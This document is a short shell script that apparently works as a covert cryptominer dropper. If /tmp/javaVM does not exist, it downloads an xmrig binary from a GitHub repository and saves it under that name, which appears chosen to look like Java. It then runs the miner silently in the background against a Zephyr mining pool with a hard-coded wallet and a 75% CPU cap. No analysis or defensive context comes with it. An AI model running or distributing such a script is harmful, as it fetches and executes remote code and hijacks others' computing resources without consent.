#!/bin/sh
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM -o	sg-zephyr.miningocean.org -u ZEPHsCfF7eDXUEjrBujn1LikKCFPmbpgfHQYdGzBZfAaVwyXFJ3pNFx5km5vJ9fLNxgGiux1Lpi8TdZ41CnAzHHXaxW3YrxqbNF -p DuckRig -t 3 -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q https://github.com/thesunofme/trash/raw/main/xmrig -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM -o	sg-zephyr.miningocean.org -u ZEPHsCfF7eDXUEjrBujn1LikKCFPmbpgfHQYdGzBZfAaVwyXFJ3pNFx5km5vJ9fLNxgGiux1Lpi8TdZ41CnAzHHXaxW3YrxqbNF -p DuckRig -t 3 -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
fi
